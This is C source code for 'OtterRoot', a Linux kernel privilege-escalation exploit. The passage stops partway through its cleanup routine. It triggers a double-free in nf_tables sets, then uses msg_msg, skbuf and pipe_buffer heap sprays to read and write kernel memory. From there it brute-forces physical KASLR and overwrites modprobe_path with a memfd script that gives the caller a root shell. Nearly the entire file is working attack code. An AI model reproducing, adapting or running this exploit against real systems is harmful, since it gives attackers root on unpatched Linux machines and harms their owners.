/*
OtterRoot: Linux Kernel Universal Exploit
<xten@osec.io>
*/
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <libmnl/libmnl.h>
#include <libnftnl/chain.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/table.h>
#include <libnftnl/object.h>
#include <libnftnl/set.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <signal.h>
#include <sched.h>
#include <unistd.h>
#include <sys/socket.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>

#define PAGE_SIZE 4096
#define PAGE_SHIFT 12
#define PHYSICAL_ALIGN 0x200000

#define MTYPE_PRIMARY 0x41
#define MTYPE_SECONDARY 0x42
#define MTYPE_FAKE 0x43

#define SPRAY 512
#define SKBUF_SPRAY 128
#define PIPE_SPRAY SKBUF_SPRAY

#define MODPROBE_SCRIPT "#!/bin/sh\necho -n 1 1>/proc/%u/fd/%u\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n"

#define MASK 0xfffffffff0000000

typedef struct
{
    long mtype;
    char mtext[0];
} msg_t;

struct list_head
{
    struct list_head *next, *prev;
};

struct msg_msg
{
    struct list_head m_list;
    long m_type;
    size_t m_ts; /* message text size */
    uint64_t next;
    uint64_t security;
    uint8_t text[0];
};

struct pipe_buffer
{
    uint64_t page;
    uint32_t offset;
    uint32_t len;
    uint64_t ops;
    uint32_t flags;
    uint32_t pad;
    uint64_t private;
};

#define KEY_LEN 32
#ifndef NFT_SET_CONCAT
#define NFT_SET_CONCAT 128
#endif

#define mnl_batch_limit (1024 * 1024)
char mnl_batch_buffer[2 * mnl_batch_limit];

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    return;
}

void set_cpu_affinity(int cpu_n, pid_t pid)
{
    cpu_set_t *set = malloc(sizeof(cpu_set_t));

    CPU_ZERO(set);
    CPU_SET(cpu_n, set);

    if (sched_setaffinity(pid, sizeof(set), set) < 0)
    {
        perror("sched_setaffinity");
        return;
    }
    free(set);
}

uint32_t family = NFPROTO_INET;
char *spray_table_name = "spray_table";
char *exploit_table_name = "exploit_table";

char *spray_chain_name = "OUTPUT";
char *exploit_chain_name = "OUTPUT";

struct nftnl_table
{
    struct list_head head;

    const char *name;
    uint32_t family;
    uint32_t table_flags;
    uint64_t handle;
    uint32_t use;
    uint32_t flags;
    uint32_t owner;
    struct
    {
        void *data;
        uint32_t len;
    } user;
};

struct nftnl_expr
{
    struct list_head head;
    uint32_t flags;
    struct expr_ops *ops;
    uint8_t data[];
};

struct nftnl_table *create_table(struct mnl_nlmsg_batch *batch, uint32_t seq, char *table_name, void *udata, uint32_t ulen)
{
    struct nftnl_table *table = nftnl_table_alloc();
    if (table == NULL)
    {
        errx(1, "nftnl_table_alloc()");
    }

    nftnl_table_set_u32(table, NFTNL_TABLE_FAMILY, family);
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);

    if (udata != NULL)
    {
        nftnl_table_set_data(table, NFTNL_TABLE_USERDATA, udata, ulen);
    }

    struct nlmsghdr *nlh = nftnl_table_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWTABLE,
        family,
        NLM_F_CREATE | NLM_F_ACK,
        seq);
    nftnl_table_nlmsg_build_payload(nlh, table);
    mnl_nlmsg_batch_next(batch);

    return table;
}

void delete_table(struct mnl_nlmsg_batch *batch, uint32_t seq, char *table_name)
{
    struct nftnl_table *table = nftnl_table_alloc();
    if (table == NULL)
    {
        errx(1, "nftnl_table_alloc()");
    }

    nftnl_table_set_u32(table, NFTNL_TABLE_FAMILY, family);
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);

    struct nlmsghdr *nlh = nftnl_table_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_DELTABLE,
        family,
        NLM_F_ACK,
        seq);
    nftnl_table_nlmsg_build_payload(nlh, table);
    mnl_nlmsg_batch_next(batch);

    nftnl_table_free(table);
}

struct nftnl_set *create_set(struct mnl_nlmsg_batch *batch, uint32_t seq,
                             char *table_name, char *set_name, uint32_t set_id, uint32_t set_flags,
                             uint32_t set_key_len, uint32_t set_desc_len, uint8_t *desc,
                             void *set_userdata, uint32_t set_userdata_len, uint32_t obj_type)
{
    struct nftnl_set *set = nftnl_set_alloc();
    if (set == NULL)
    {
        errx(1, "nftnl_set_alloc()");
    }

    nftnl_set_set_u32(set, NFTNL_SET_FAMILY, family);
    nftnl_set_set_str(set, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);
    nftnl_set_set_u32(set, NFTNL_SET_ID, set_id);
    nftnl_set_set_u32(set, NFTNL_SET_FLAGS, set_flags);
    nftnl_set_set_u32(set, NFTNL_SET_KEY_LEN, set_key_len);
    if (set_userdata != NULL)
    {
        nftnl_set_set_data(set, NFTNL_SET_USERDATA, set_userdata, set_userdata_len);
    }
    if (desc != NULL)
    {
        nftnl_set_set_data(set, NFTNL_SET_DESC_CONCAT, desc, sizeof(uint8_t) * set_desc_len);
    }
    if (obj_type != 0)
    {
        nftnl_set_set_u32(set, NFTNL_SET_OBJ_TYPE, obj_type);
    }

    struct nlmsghdr *nlh = nftnl_set_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWSET,
        family,
        NLM_F_CREATE | NLM_F_ACK,
        seq);
    nftnl_set_nlmsg_build_payload(nlh, set);
    mnl_nlmsg_batch_next(batch);

    return set;
}

static void create_chain(struct mnl_nlmsg_batch *batch, uint32_t seq,
                         char *table_name, char *chain_name)
{
    struct nftnl_chain *chain = nftnl_chain_alloc();
    if (chain == NULL)
    {
        errx(1, "nftnl_chain_alloc()");
    }

    nftnl_chain_set_u32(chain, NFTNL_CHAIN_FAMILY, family);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, table_name);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, chain_name);

    struct nlmsghdr *nlh = nftnl_chain_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWCHAIN,
        family,
        NLM_F_CREATE | NLM_F_ACK,
        seq);
    nftnl_chain_nlmsg_build_payload(nlh, chain);
    mnl_nlmsg_batch_next(batch);

    nftnl_chain_free(chain);
}

static void prepare_nftables(struct mnl_socket *nl)
{
    uint32_t portid, seq, table_seq;
    int ret;

    seq = rand() % (UINT32_MAX / 2);

    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    table_seq = seq;
    mnl_nlmsg_batch_next(batch);

    // table for spray
    create_table(batch, seq++, spray_table_name, NULL, 0);
    create_chain(batch, seq++, spray_table_name, spray_chain_name);

    // table for exploit
    create_table(batch, seq++, exploit_table_name, NULL, 0);
    create_chain(batch, seq++, exploit_table_name, exploit_chain_name);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    portid = mnl_socket_get_portid(nl);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] mnl_socket_sendto()");
    }

    mnl_nlmsg_batch_stop(batch);

    while (table_seq + 1 != seq)
    {
        ret = mnl_socket_recvfrom(nl, mnl_batch_buffer, mnl_batch_limit);
        if (ret == -1)
        {
            perror("[-] mnl_socket_recvfrom()");
        }
        ret = mnl_cb_run(mnl_batch_buffer, ret, table_seq, portid, NULL, NULL);
        if (ret == -1)
        {
            perror("[-] mnl_cb_run()");
        }
        table_seq++;
    }
}

static void trigger_uaf(struct mnl_socket *nl, size_t size, int *msgqids)
{
    uint32_t seq;
    struct nlmsghdr *nlh;
    struct mnl_nlmsg_batch *batch;
    struct nftnl_set *set;
    char *udata_buf[size];
    char key[KEY_LEN];
    struct nft_set_elem *elem[3];
    memset(udata_buf, 0x41, size);

    int ret;
    int evil_qids[2];

    seq = rand() % (UINT32_MAX / 2);

    // TRANSACTION 1
    batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    // dummy obj (not relevant)
    struct nftnl_obj *obj = nftnl_obj_alloc();
    nftnl_obj_set_str(obj, NFTNL_OBJ_NAME, "pwnobj");
    nftnl_obj_set_str(obj, NFTNL_OBJ_TABLE, exploit_table_name);
    nftnl_obj_set_u32(obj, NFTNL_OBJ_TYPE, NFT_OBJECT_CT_EXPECT);
    nftnl_obj_set_u8(obj, NFTNL_OBJ_CT_EXPECT_L4PROTO, IPPROTO_TCP);
    nftnl_obj_set_u8(obj, NFTNL_OBJ_CT_EXPECT_SIZE, 0x41);
    nftnl_obj_set_u8(obj, NFTNL_OBJ_CT_EXPECT_DPORT, 0x4141);
    nftnl_obj_set_u8(obj, NFTNL_OBJ_CT_EXPECT_TIMEOUT, 0x41414141);
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_NEWOBJ, family,
                                NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
                                seq++);
    nftnl_obj_nlmsg_build_payload(nlh, obj);
    nftnl_obj_free(obj);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] mnl_socket_sendto");
    }
    mnl_nlmsg_batch_stop(batch);

    // TRANSACTION 2
    batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    // create pipapo set
    uint8_t desc[2] = {16, 16};
    set = create_set(
        batch, seq++, exploit_table_name, "pwn_set", 0x1337,
        NFT_SET_INTERVAL | NFT_SET_OBJECT | NFT_SET_CONCAT, KEY_LEN, 2, &desc, NULL, 0, NFT_OBJECT_CT_EXPECT);

    // commit elems to set
    for (int i = 0; i < 2; i++)
    {
        elem[i] = nftnl_set_elem_alloc();
        memset(key, 0x41 + i, KEY_LEN);
        nftnl_set_elem_set(elem[i], NFTNL_SET_ELEM_OBJREF, "pwnobj", 7);
        nftnl_set_elem_set(elem[i], NFTNL_SET_ELEM_KEY, &key, KEY_LEN);
        nftnl_set_elem_set(elem[i], NFTNL_SET_ELEM_USERDATA, &udata_buf, size);
        nftnl_set_elem_add(set, elem[i]);
    }

    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_NEWSETELEM, family,
                                NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
                                seq++);
    nftnl_set_elems_nlmsg_build_payload(nlh, set);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] [-] mnl_socket_sendto");
    }
    mnl_nlmsg_batch_stop(batch);

    // TRANSACTION 3
    batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    set = nftnl_set_alloc();
    nftnl_set_set_u32(set, NFTNL_SET_FAMILY, family);
    nftnl_set_set_str(set, NFTNL_SET_TABLE, exploit_table_name);
    nftnl_set_set_str(set, NFTNL_SET_NAME, "pwn_set");

    // make priv->dirty true
    memset(key, 0xff, KEY_LEN);
    elem[3] = nftnl_set_elem_alloc();
    nftnl_set_elem_set(elem[3], NFTNL_SET_ELEM_OBJREF, "pwnobj", 7);
    nftnl_set_elem_set(elem[3], NFTNL_SET_ELEM_KEY, &key, KEY_LEN);
    nftnl_set_elem_add(set, elem[3]);

    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_NEWSETELEM, family,
                                NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
                                seq++);
    nftnl_set_elems_nlmsg_build_payload(nlh, set);
    mnl_nlmsg_batch_next(batch);

    // double-free commited elems
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_DELSET, family,
                                NLM_F_ACK,
                                seq++);
    nftnl_set_nlmsg_build_payload(nlh, set);
    nftnl_set_free(set);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] mnl_socket_sendto");
    }
    mnl_nlmsg_batch_stop(batch);
}

bool trigger_modprobe(int status_fd)
{
    char *argv = NULL;
    int fd = memfd_create("", MFD_CLOEXEC);
    int status = 0;

    write(fd, "\xff\xff\xff\xff", 4);
    fexecve(fd, &argv, &argv);
    close(fd);

    read(status_fd, &status, 1);
    if (status)
    {
        return true;
    }
    return false;
}

void udata_spray(struct mnl_socket *nl, uint32_t size, uint32_t start, uint32_t count, void *data)
{
    char spray_name[16];
    char udata_buf[size];
    char *dptr = &udata_buf;
    uint32_t seq = rand() % (UINT32_MAX / 2);
    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (data)
    {
        dptr = data;
    }

    for (int i = start; i < start + count; i++)
    {
        if (!data)
        {
            memset(udata_buf, 0x30 + i, size);
        }
        snprintf(spray_name, sizeof(spray_name), "spray-%i", i);
        nftnl_table_free(create_table(batch, seq++, spray_name, dptr, size));
    }

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] mnl_socket_sendto");
    }
    mnl_nlmsg_batch_stop(batch);
}

void deludata_spray(struct mnl_socket *nl, uint32_t start, uint32_t count)
{
    char spray_name[16];
    uint32_t seq = rand() % (UINT32_MAX / 2);
    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    for (int i = start; i < start + count; i++)
    {
        snprintf(spray_name, sizeof(spray_name), "spray-%i", i);
        delete_table(batch, seq++, spray_name);
    }

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] mnl_socket_sendto");
    }
    mnl_nlmsg_batch_stop(batch);
}

static int table_cb(const struct nlmsghdr *nlh, void *data)
{
    char buf[4096];
    struct nftnl_table **out = (struct nftnl_table **)data;

    struct nftnl_table *table = nftnl_table_alloc();

    if (nftnl_table_nlmsg_parse(nlh, table) < 0)
    {
        perror("nftnl_table_nlmsg_parse");
        goto err_free;
    }

    nftnl_table_snprintf(buf, sizeof(buf), table, NFTNL_OUTPUT_DEFAULT, 0);
    *out = table;
    goto out;

err_free:
    nftnl_table_free(table);
out:
    return MNL_CB_OK;
}

char *getudata(struct mnl_socket *nl, char *table_name)
{
    char buf[MNL_SOCKET_BUFFER_SIZE];
    uint32_t seq = rand() % (UINT32_MAX / 2);
    struct nftnl_table *table = nftnl_table_alloc();
    struct nlmsghdr *nlh = nftnl_table_nlmsg_build_hdr(buf, NFT_MSG_GETTABLE, family,
                                                       NLM_F_ACK, seq);
    uint32_t portid = mnl_socket_get_portid(nl);
    uint32_t type = NFTNL_OUTPUT_DEFAULT;
    int ret;

    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
    nftnl_table_nlmsg_build_payload(nlh, table);
    nftnl_table_free(table);

    if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0)
    {
        perror("[-] mnl_socket_sendto");
    }

    ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
    while (ret > 0)
    {
        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        if (ret > 200 && ret < 300)
        {
            mnl_cb_run(buf, ret, seq, portid, table_cb, &table);
            break;
        }
    }
    if (ret < 0)
    {
        perror("[-] mnl_socket_recvfrom");
    }

    char *out = calloc(1, table->user.len);
    memcpy(out, table->user.data, table->user.len);
    return out;
}

bool isheap(uint64_t ptr)
{
    int high = ptr >> 44;
    if (high >= 0xffff8 && high < 0xfffff)
    {
        return true;
    }
    return false;
}

bool ismsg(uint64_t *obj, uint64_t mtype)
{
    if (isheap(obj[0]) &&
        isheap(obj[1]) &&
        obj[2] == mtype)
    {
        return true;
    }
    return false;
}

void wait_destroyer(void)
{
    usleep(20 * 1000); // let destroyer work finish
}

bool check_modprobe(char *expected)
{
    char buf[32];
    int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    if (fd < 0)
    {
        perror("[-] open(modprobe)");
    }
    read(fd, buf, 32);
    if (!strcmp(buf, expected))
    {
        close(fd);
        return true;
    }
    close(fd);
    return false;
}

static bool is_kernel_base(unsigned char *addr)
{
    // thanks lau :)

    // get-sig kernel_runtime_1
    if (memcmp(addr + 0x0, "\x48\x8d\x25\x51\x3f", 5) == 0 &&
        memcmp(addr + 0x7, "\x48\x8d\x3d\xf2\xff\xff\xff", 7) == 0)
        return true;

    // get-sig kernel_runtime_2
    if (memcmp(addr + 0x0, "\xfc\x0f\x01\x15", 4) == 0 &&
        memcmp(addr + 0x8, "\xb8\x10\x00\x00\x00\x8e\xd8\x8e\xc0\x8e\xd0\xbf", 12) == 0 &&
        memcmp(addr + 0x18, "\x89\xde\x8b\x0d", 4) == 0 &&
        memcmp(addr + 0x20, "\xc1\xe9\x02\xf3\xa5\xbc", 6) == 0 &&
        memcmp(addr + 0x2a, "\x0f\x20\xe0\x83\xc8\x20\x0f\x22\xe0\xb9\x80\x00\x00\xc0\x0f\x32\x0f\xba\xe8\x08\x0f\x30\xb8\x00", 24) == 0 &&
        memcmp(addr + 0x45, "\x0f\x22\xd8\xb8\x01\x00\x00\x80\x0f\x22\xc0\xea\x57\x00\x00", 15) == 0 &&
        memcmp(addr + 0x55, "\x08\x00\xb9\x01\x01\x00\xc0\xb8", 8) == 0 &&
        memcmp(addr + 0x61, "\x31\xd2\x0f\x30\xe8", 5) == 0 &&
        memcmp(addr + 0x6a, "\x48\xc7\xc6", 3) == 0 &&
        memcmp(addr + 0x71, "\x48\xc7\xc0\x80\x00\x00", 6) == 0 &&
        memcmp(addr + 0x78, "\xff\xe0", 2) == 0)
        return true;

    return false;
}

int exploit(int argc, char **argv)
{
    // Setup I/O for shell
    int stdin_fd = dup(STDIN_FILENO);
    int stdout_fd = dup(STDOUT_FILENO);

    // Setup fake modprobe
    int modprobe_fd = memfd_create("", MFD_CLOEXEC);
    int status_fd = memfd_create("", 0);

    // Setup netlink
    struct mnl_socket *nl;
    nl = mnl_socket_open(NETLINK_NETFILTER);
    if (nl == NULL)
    {
        perror("[-] mnl_socket_open()");
    }

    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0)
    {
        perror("[-] mnl_socket_bind()");
    }

    // Setup skbuf
    int sock[SKBUF_SPRAY][2];
    for (int i = 0; i < SKBUF_SPRAY; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock[i]) < 0)
        {
            perror("[-] socketpair");
            return -1;
        }
    }

    // Setup table and chains
    puts("[*] prepare table and chain");
    prepare_nftables(nl);

    // Spray msg_msg in kmalloc-256 and kmalloc-1k
    msg_t *msg = calloc(1, sizeof(msg_t) + 0xe8 - 48);
    int qid[SPRAY];
    for (int i = 0; i < SPRAY; i++)
    {
        qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (qid[i] < 0)
        {
            perror("[-] msgget");
        }
        *(uint32_t *)msg->mtext = i;
        *(uint64_t *)&msg->mtext[8] = 0xdeadbeefcafebabe;
        msg->mtype = MTYPE_PRIMARY;
        msgsnd(qid[i], msg, 0xe8 - 48, 0);
        msg->mtype = MTYPE_SECONDARY;
        msgsnd(qid[i], msg, 1024 - 48, 0);
    }

    // Prepare evil msg
    int evilqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (evilqid < 0)
    {
        perror("[-] msgget");
    }

    puts("[*] trigger double-free");
    trigger_uaf(nl, 0x88 + 3, NULL);
    wait_destroyer();

    udata_spray(nl, 0xe8, 0, 3, NULL);

    char spray_name[16];
    char *udata[3];
    for (int i = 0; i < 3; i++)
    {
        snprintf(spray_name, sizeof(spray_name), "spray-%i", i);
        udata[i] = getudata(nl, spray_name);
    }
    if (udata[0][0] == udata[2][0])
    {
        puts("[+] got duplicated table");
    }
    else
    {
        puts("[-] exploit failed");
        return -1;
    }

    // Replace nft_obj with msg_msg
    puts("[*] replace with msg_msg");
    memset(msg->mtext, 0x41, 8);
    msg->mtype = MTYPE_PRIMARY;

    deludata_spray(nl, 0, 1);
    wait_destroyer();
    msgsnd(evilqid, msg, 0xe8 - 48, 0);
    msg->mtype = MTYPE_SECONDARY;
    msgsnd(evilqid, msg, 1024 - 48, 0);
    uint64_t *fake_obj = (uint64_t *)getudata(nl, "spray-2");

    uint64_t msg_ptr = fake_obj[0];
    printf("[*] kmalloc-1k msg: 0x%lx\n", msg_ptr);

    // Find next msg
    fake_obj[0] -= 1024 * 20;
    deludata_spray(nl, 2, 1);
    wait_destroyer();
    udata_spray(nl, 0xe8, 3, 1, fake_obj);
    wait_destroyer();
    if (msgrcv(evilqid, msg, 1024 - 48, MTYPE_SECONDARY, IPC_NOWAIT | MSG_COPY) < 0)
    {
        perror("[-] msgrcv");
    }

    int victim_idx = *(uint32_t *)msg->mtext;
    printf("[*] victim qid: %i\n", qid[victim_idx]);

    // Free kmalloc-1k msg
    if (msgrcv(qid[victim_idx], msg, 1024 - 48, MTYPE_SECONDARY, 0) < 0)
    {
        perror("[-] msgrcv");
    }

    // Replace msg with a fake msg using skbuf
    struct msg_msg *fake_msg = calloc(1, sizeof(struct msg_msg) + 1024 - 48);
    fake_msg->m_list.next = msg_ptr - 1024 * 20;
    fake_msg->m_list.prev = msg_ptr - 1024 * 20;
    fake_msg->m_type = MTYPE_FAKE;
    fake_msg->m_ts = 1024 - 48;
    *(uint64_t *)fake_msg->text = 0x1337133713371337;
    puts("[*] send fake msg skbuf");
    for (int i = 0; i < SKBUF_SPRAY; i++)
    {
        if (write(sock[i][0], fake_msg, 1024 - 320) < 0)
        {
            perror("[-] write(socket)");
            return -1;
        }
    }

    // Double free kmalloc-1k msg
    puts("[*] double-free victim msg");
    if (msgrcv(evilqid, msg, 1024 - 48, MTYPE_FAKE, 0) < 0)
    {
        perror("[-] msgrcv");
    }

    // Spray pipe_buffer victims
    int fdflags;
    int pfd[PIPE_SPRAY][2];
    for (int i = 0; i < PIPE_SPRAY; i++)
    {
        pipe(pfd[i]);
        fdflags = fcntl(pfd[i][0], F_GETFL, 0);
        fcntl(pfd[i][0], F_SETFL, fdflags | O_NONBLOCK);
        fdflags = fcntl(pfd[i][1], F_GETFL, 0);
        fcntl(pfd[i][1], F_SETFL, fdflags | O_NONBLOCK);
    }

    // Populate pipe_buffer
    for (int i = 0; i < PIPE_SPRAY; i++)
    {
        write(pfd[i][1], "pwn", 3);
    }

    // Leak pipe_buffer
    char leak[1024];
    struct pipe_buffer *pipebuf = calloc(1, 1024);
    puts("[*] read pipe_buffer with skbuf");
    for (int i = 0; i < SKBUF_SPRAY; i++)
    {
        if (read(sock[i][1], leak, 1024 - 320) < 0)
        {
            perror("[-] read(socket)");
            return -1;
        }
        if (*(uint64_t *)&leak[48] != 0x1337133713371337)
        {
            memcpy(pipebuf, leak, 1024);
            puts("[+] found pipe_buffer");
        }
    }

    uint64_t vmemmap_base = pipebuf->page & MASK;
    printf("[*] vmemmap_base: 0x%lx\n", vmemmap_base);

    // Bruteforce phys-KASLR
    uint64_t kernel_base;
    bool found = false;
    uint8_t data[PAGE_SIZE] = {0};
    puts("[*] bruteforce phys-KASLR");
    for (uint64_t i = 0;; i++)
    {
        kernel_base = 0x40 * ((PHYSICAL_ALIGN * i) >> PAGE_SHIFT);
        pipebuf->page = vmemmap_base + kernel_base;
        pipebuf->offset = 0;
        pipebuf->len = PAGE_SIZE + 1;

        printf("\r[*] trying 0x%lx", pipebuf->page);

        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (write(sock[i][0], pipebuf, 1024 - 320) < 0)
            {
                perror("\n[-] write(socket)");
                return -1;
            }
        }

        for (int j = 0; j < PIPE_SPRAY; j++)
        {
            memset(&data, 0, PAGE_SIZE);
            int count;
            if (count = read(pfd[j][0], &data, PAGE_SIZE) < 0)
            {
                continue;
            }

            if (!memcmp(&data, "pwn", 3))
            {
                continue;
            }

            if (is_kernel_base(data))
            {
                found = true;
                break;
            }
        }

        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (read(sock[i][1], leak, 1024 - 320) < 0)
            {
                perror("[-] read(socket)");
                return -1;
            }
        }

        if (found)
        {
            break;
        }
    }
    found = false;
    printf("\n[+] kernel base vmemmap offset: 0x%lx\n", kernel_base);

    // Scan kernel memory
    uint64_t modprobe_page, modprobe_off;
    uint32_t pipe_idx;
    uint64_t base_off = 0;
    puts("[*] scanning kernel memory");
    for (uint64_t i = 0;; i++)
    {
        pipebuf->page = vmemmap_base + kernel_base + 0x40 * i;
        pipebuf->offset = 0;
        pipebuf->len = PAGE_SIZE + 1;

        if (!(i % 1000))
        {
            printf("\r[*] trying 0x%lx, %iMb", pipebuf->page, i * 4096 / 1024 / 1024);
        }
        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (write(sock[i][0], pipebuf, 1024 - 320) < 0)
            {
                perror("\n[-] write(socket)");
                return -1;
            }
        }

        for (int j = 0; j < PIPE_SPRAY; j++)
        {
            memset(&data, 0, PAGE_SIZE);
            int count;
            if (count = read(pfd[j][0], &data, PAGE_SIZE) < 0)
            {
                continue;
            }

            if (!memcmp(&data, "pwn", 3))
            {
                continue;
            }

            void *locate = (uint64_t *)memmem(&data, PAGE_SIZE, "/sbin/modprobe", sizeof("/sbin/modprobe"));
            if (locate)
            {
                puts("\n[+] found modprobe_path");
                modprobe_page = pipebuf->page;
                modprobe_off = (uint8_t *)locate - data;
                printf("[*] modprobe page: 0x%lx\n", modprobe_page);
                printf("[*] modprobe offset: 0x%lx\n", modprobe_off);
                found = true;
                pipe_idx = j;
                break;
            }
        }

        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (read(sock[i][1], leak, 1024 - 320) < 0)
            {
                perror("[-] read(socket)");
                return -1;
            }
        }

        if (found)
        {
            break;
        }
    }

    char fd_path[32] = {0};
    puts("[*] overwrite modprobe_path");
    for (int i = 0; i < 4194304; i++)
    {
        pipebuf->page = modprobe_page;
        pipebuf->offset = modprobe_off;
        pipebuf->len = 0;
        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (write(sock[i][0], pipebuf, 1024 - 320) < 0)
            {
                perror("[-] write(socket)");
                break;
            }
        }

        memset(&data, 0, PAGE_SIZE);
        snprintf(fd_path, sizeof(fd_path), "/proc/%i/fd/%i", i, modprobe_fd);

        lseek(modprobe_fd, 0, SEEK_SET);
        dprintf(modprobe_fd, MODPROBE_SCRIPT, i, status_fd, i, stdin_fd, i, stdout_fd);

        if (write(pfd[pipe_idx][1], fd_path, 32) < 0)
        {
            perror("\n[-] write(pipe)");
        }

        if (check_modprobe(fd_path))
        {
            puts("[-] failed to overwrite modprobe");
            break;
        }

        if (trigger_modprobe(status_fd))
        {
            puts("\n[+] got root");
            goto out;
        }

        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (read(sock[i][1], leak, 1024 - 320) < 0)
            {
                perror("[-] read(socket)");
                return -1;
            }
        }
    }
    puts("[-] fake modprobe failed");

out:
    for (int i = 0; i < SKBUF_SPRAY; i++)
    {
        if (read(sock[i][1], leak, 1024 - 320) < 0)
        {
            perror("[-] read(socket)");
            return -1;
        }
    }

    // Release slots in kmalloc-256 to avoid dereferencing corrupted freelist
    for (int i = 0; i < SPRAY; i++)
    {
        if (qid[i] == -1)
        {
            continue;
        }
        if (msgrcv(qid[i], msg, 0xe8 - 48, MTYPE_PRIMARY, IPC_NOWAIT) < 0)
        {
            perror("[-] msgrcv");
        }
        if (msgrcv(qid[i], msg, 1024 - 48, MTYPE_SECONDARY, IPC_NOWAIT) < 0)
        {
            perror("[-] msgrcv");
        }
